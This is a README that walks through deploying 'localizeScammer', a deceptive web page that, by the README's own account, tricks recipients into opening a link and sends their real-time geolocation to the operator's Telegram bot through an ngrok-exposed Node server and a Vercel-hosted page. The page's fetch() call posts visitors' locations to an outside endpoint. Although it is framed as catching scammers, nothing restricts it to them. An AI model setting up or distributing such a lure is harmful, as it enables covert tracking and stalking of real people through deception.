<h1 align="center">🕵️‍♂️ localizeScammer</h1>
<h3 align="center" style="color: red;">
🚨 A tool designed to catch dumb scammers who think they’re smarter than you. 🚨
</h3>

<p align="center">
This project tracks scammer locations in real time by tricking them into opening a simple link. <br>
Because some scams deserve to be exposed. 💥
</p>

## 1. Install Project Dependencies

```bash
npm install
```

---

## 2. Configure Environment Variables

Edit the `server.js` file:

```bash
nano server.js
```

Replace **BOT-TOKEN** with your Telegram bot token.

Replace **CHAT-TOKEN** with the chat or group ID where you want to receive messages.

Press **CTRL + X**, then **Y**, and **Enter** to save.

---

## 3. Create and Configure a Telegram Bot

1. Open Telegram and search for **@BotFather**.
2. Send the command:
   ```
   /newbot
   ```
3. Follow the instructions and save the **token** provided.
4. To obtain the **chat/group ID**:
   - Add the bot to your group.
   - Send a message in the group.
   - Access:
     ```
     https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
     ```
   - Locate the `chat_id`.

---

## 4. Start the Server

```bash
node server.js
```

If everything is correct, the output should confirm the server is running.

---

## 5. Install and Configure Ngrok

Ngrok is used to expose your local server to the internet.

### 5.1 Download and Install Ngrok

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x ngrok
sudo mv ngrok /usr/local/bin/
```

### 5.2 Create a Ngrok Account

Go to [https://ngrok.com/](https://ngrok.com/) and create an account.

After creating an account, get your **Authtoken** and run:

```bash
ngrok authtoken YOUR_AUTHTOKEN
```

---

## 6. Expose the Server with Ngrok

```bash
ngrok http 8088
```

Copy the **URL generated by Ngrok** (example: `https://abc123.ngrok.io`).

---

## 7. Update the Endpoint in the Project

Open the `index.html` file:

```bash
nano index.html
```

Replace the endpoint URL:

```js
fetch("https://abc123.ngrok.io/send-location", {
```

Save the changes (**CTRL + X**, **Y**, **Enter**).

---

## 8. Test the Project

Open `index.html` in your browser and allow location access. If everything is set correctly, your location will be sent to the Telegram bot.

---

## 9. Deploy the HTML Page on Vercel

To make the **localizeScammer** interface publicly accessible, host `index.html` on Vercel.

### 9.1 Create a Vercel Account

1. Go to [https://vercel.com/](https://vercel.com/) and create an account (you can use your GitHub login).
2. After logging in, click on **"New Project"**.

### 9.2 Upload the Project to GitHub

If you haven’t pushed the code yet:

```bash
git init
git add index.html
git commit -m "Add localizeScammer interface"
git branch -M main
git remote add origin https://github.com/your-username/localize-scammer-frontend.git
git push -u origin main
```

### 9.3 Deploy on Vercel

1. On Vercel, click **"Import Git Repository"** and select your project repository.
2. Choose default settings and click **Deploy**.
3. After deployment, copy the generated URL (e.g., `https://localizescammer.vercel.app`).

Your project is now live! 🚀

---

## Conclusion

You’ve successfully set up and deployed the localizeScammer project, ready to receive real-time geolocation updates via Telegram. 🚀
